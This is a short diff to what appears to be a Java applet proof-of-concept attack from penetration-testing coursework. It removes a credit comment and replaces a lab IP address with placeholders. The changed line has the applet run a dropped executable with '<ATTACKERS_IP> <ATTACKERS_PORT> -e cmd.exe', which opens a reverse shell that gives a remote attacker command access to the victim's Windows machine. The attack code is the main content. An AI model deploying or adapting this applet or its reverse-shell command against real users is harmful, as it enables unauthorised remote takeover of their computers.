@@ -1,5 +1,3 @@
-//Credit to Offensive Security for this POC
-
 import java.applet.*;
 import java.awt.*;
 import java.io.*;
@@ -36,7 +34,7 @@ public class JavaAppletATK extends Applet {
 		     out.flush();
 	             out.close();
 		     in.close();
-		     f = Runtime.getRuntime().exec("cmd.exe /c " + expath + " 10.11.0.41 4444 -e cmd.exe");
+		     f = Runtime.getRuntime().exec("cmd.exe /c " + expath + " <ATTACKERS_IP> <ATTACKERS_PORT> -e cmd.exe");
              }		
 	} catch(IOException e) {
 		e.printStackTrace();
